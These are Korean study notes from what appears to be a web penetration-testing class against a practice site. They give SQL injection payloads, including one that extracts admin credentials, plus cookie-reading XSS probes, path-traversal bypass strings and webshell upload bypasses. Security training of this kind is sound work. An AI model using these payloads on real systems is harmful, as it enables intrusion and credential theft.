수동점검 - 버프슈트 or 피들러

피들러는 웹페이지 한정 진단에 특화됨, 버프슈트는 웹페이지 진단 뿐만 아니라 다른 진단에도 활용할 수 있음 확장성이 큼.
burpgpt - 버프슈트와 연동할 수 있는 확장프로그램으로, 버프슈트 라이센스 버전을 사용할 경우에만 활용 가능. llm이 탑재되어 분석에 도움을 줌

자동점검 - owasp zap\

웹페이지 진단 시 "데이터 평문 전송"에 해당하는 취약점 점검은 와이어샤크로 진행하며 나머지는 버프슈트를 이용함


-----------------------------

http://gym.contentshub.kr:50200

<SQL Injection 진단>
- 기본 구문 : ' or 1=1 -- 
?idx=36'%20or%201=1%20--%20&keyfield=&keyword=
?idx=36' or 1=1 -- &keyfield=&keyword= (O)
- SQL Injection 을 통한 데이터 추출
(1) Error based SQLi : 강제로 에러를 유발시켜 데이터를 추출
(2) Union based SQLi : Union 키워드를 사용해서 select 문으로 데이터를 추출
ex) users 테이블 : id, pw, email, address / goods 테이블 : name, prise, company
select * from goods union select * from users; (X)
=> union 키워드는 앞의 테이블의 컬럼 개수 == 뒤 테이블의 컬럼 개수
select * from goods union select id,pw,email from users; (O)

?idx=36'%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18%20--%20
?idx='%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18%20--%20
?idx='%20union%20select%201,2,3,4,5,6,7,8,database(),10,11,12,13,14,15,16,17,18%20--%20

CF) 특정 데이터 추출하는 경우
- 순서 : 테이블 -> 컬럼 -> 데이터
sysobjects : table의 정보가 담겨있는 테이블(시스템 테이블 포함)
=> table 이름 컬럼 : name
syscolumns : column의 정보가 담겨있는 테이블(시스템 컬럼 포함)
=> column 이름 컬럼 : name
information_schema.tables : table의 정보가 담겨있는 테이블
=> table 이름 컬럼 : table_name
information_schema.columns : columns의 정보가 담겨있는 테이블
=> column 이름 컬럼 : column_name
=> table 이름 컬럼 : table_name
?idx='%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,group_concat(table_name),17,18%20from%20information_schema.tables%20--%20
=> hm_admin_tb
?idx='%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,group_concat(column_name),17,18%20from%20information_schema.columns%20where%20table_name='hm_admin_tb'%20--%20
?idx='%20union%20select%201,2,3,4,5,6,7,8,admin_id,10,11,12,13,14,15,admin_pass,17,18%20from%20hm_admin_tb%20--%20
(3) Blind SQLi : 참/거짓 쿼리를 입력했을 때 웹 서비스의 반응이 다름을 기준으로 데이터 추출
무조건 참 : 36' and 1=1 -- 
무조건 거짓 : 36' and 1=2 -- 
substring(<문자열>,<커서위치>,<길이>);
substring('admin',1,1);
substring('admin',2,1);
36' and substring((select database()),1,1) > 'a' -- 
- Time based Blind SQLi
36' or 1=1 and sleep(5) -- 
36' or 1=1 and substring((select database()),1,1)='s' and sleep(5) -- 

<XSS 점검>
- 점검할 서비스 판단 기준 : 입력한 데이터가 웹 서비스에 출력
=> 출력 기준은 웹 페이지에서 보이는 수준 X
=> html 소스코드로 볼 때 입력한 데이터가 보여야 함
- 기본 점검 코드
<script>alert(document.cookie);</script>
"><script>alert(document.cookie);</script>
><script>alert(document.cookie);</script>
--><script>alert(document.cookie);</script>
<script>console.log(document.cookie);</script>
<script>alert(document['cookie']);</script>
CF) 업로드된 파일을 다운로드할 때 바로 웹서버에 요청하는 방식이 아닌 a 태그 등 태그내 자바스크립트를 이용하는 경우
<a href="javascript:download('test.txt');">
일반적인 파일 이름 : test.txt
Stored XSS 용 파일 이름 : test.txt');alert(document.cookie);alert('xss
download('     test.txt');alert(document.cookie);alert('xss    ');

<파일 다운로드 취약점 점검>
/_core/_download.php?file_url=notice&file_name=notice_5f8ff94a40c6b.txt&real_name=test.txt
- 점검 코드 : ../ ..\
- 우회 기법 : ....// ..././ ....\\ ...\.\ %2E%2E%2F %2E%2E%2E%2E%2F%2F %2E%2E%2E%2F%2E%2F
(1) 현재 다운받는 파일의 절대 경로
gym.contentshub.kr:50200/_core/~~~~/notice/~~~~/test.txt
gym.contentshub.kr:50200/_core/~~~~/notice/test.txt
gym.contentshub.kr:50200/_core/notice/~~~~/test.txt
gym.contentshub.kr:50200/_core/notice/test.txt
(2) 다운받고자 하는 파일(소스, 설정 등)의 절대 경로
_download.php 파일 다운로드 시도
gym.contentshub.kr:50200/_core/_download.php
(3) 둘의 상대 경로 계산
../../../_download.php
../../_download.php
../_download.php

CF) PHP, ASP 인 경우 서버 내부의 소스코드(백엔드)를 다운로드 시도
     JSP 인 경우 /WEB-INF/web.xml, /server.xml
CF2) 파일 다운로드 취약점 점검 시 ../ ..\가 유효한지 먼저 테스트
A게시판에 1.txt : aboard/files/1.txt
B게시판에 2.txt : bboard/files/2.txt
../../bboard/files/2.txt

<파일 업로드 취약점>
- 인가되지 않은 파일이 업로드 되는지 점검
=> 웹쉘을 사용하는 경우 웹 서비스의 백엔드 언어에 해당하는 웹쉘을 사용해야 함
- 점검 코드 : webshell.php
- 우회 방법 : webshell.txt.php 또는 webshell.php%00.txt
※ 파일 업로드 취약점 점검 시 업로드 된 파일의 경로와 파일 이름을 알 수 없음
(1) 웹 서비스(다운로드)를 분석해서 경로를 유추
(2) 다른 웹 취약점을 연계
(2-1) 디렉토리 리스팅
(2-2) 파일 다운로드 취약점
=> 파일 업로드 관련 소스코드를 다운 받아서 경로 및 이름 확인
==> 현재 웹 서비스에서는 파일 이름이 난수가 포함되어 있어 경로만 확인할 수 있음
===> 원본 파일 이름과 서버에 올라간 파일 이름이 다름에도 원본 파일 이름으로 다운로드가 된다?!
===> 원본 파일과 바뀐 파일 이름이 맵핑되어 저장되어있을 것으로 추측, DB 저장(?)



CF) 192.168.110.87
